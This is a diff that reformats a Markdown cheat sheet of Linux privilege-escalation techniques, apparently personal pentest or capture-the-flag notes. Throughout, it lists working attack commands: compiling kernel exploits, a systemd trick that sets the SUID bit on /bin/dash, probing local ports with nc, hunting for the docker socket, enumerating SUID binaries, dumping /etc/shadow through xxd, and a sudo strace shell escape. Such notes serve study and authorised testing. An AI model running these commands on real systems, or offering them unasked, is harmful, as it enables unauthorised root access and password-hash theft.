@@ -1,27 +1,32 @@
 # Priv-Esc Linux
 
-## Tools 
+## **Tools**
 
 - [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration)
 - [LinEnum](https://github.com/rebootuser/LinEnum)
 
-## Kernel Exploitation
+---
 
-Check version
-```sh
+## **Kernel Exploitation**
+
+### Check version
+
+```bash
 uname -a
 cat /etc/*release
 cat /etc/issue
 ```
 
 Compile for x86 on a x64 machine
-```sh
+
+```bash
 sudo apt update && sudo apt install gcc-multilib 
 gcc -Wl,--hash-style=both -m32 <exploit.c>
 ```
 
+---
 
-## Systemd
+## **Systemd**
 
 ```bash
 echo -e '#!/bin/bash\nchmod 4755 /bin/dash' > /tmp/priv.sh 
@@ -30,14 +35,18 @@ edit line : ExecStart in `/tmp/priv.sh
 reboot
 ```
 
-## Programms running
+---
+
+## **Programms running**
 
 ```bash
 ps -aux | grep root
 https://github.com/DominicBreuker/pspy 
 ```
 
-## Services listening
+---
+
+## **Services listening**
 
 ```bash
 netstat -latupen | grep LISTEN
@@ -45,26 +54,34 @@ netstat -nlt | awk -F : '/\<tcp\>/ {split($2,a," "); print a[1]}' | xargs -I % b
 netstat -nlt | grep 'tcp ' | grep -Eo "[1-9][0-9]*" | xargs -I {} sh -c "echo "" | nc -v -n -w1 127.0.0.1 {}"
 ```
 
-## Docker
+---
+
+## **Docker**
 
 ```bash
 find / -group docker -exec ls -la {} 2>/dev/null \;
 => on cherche le docker.sock
 ```
 
-## Binaries enum
+---
+
+## **Binaries enum**
 
 ```bash
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
 ```
 
-## Hash dump
+---
+
+## **Hash dump**
 
 ```bash
 sudo xxd /etc/shadow | xxd -r
 ```
 
-## Strace root
+---
+
+## **Strace root**
 
 ```bash
 sudo strace -o /dev/null /bin/sh
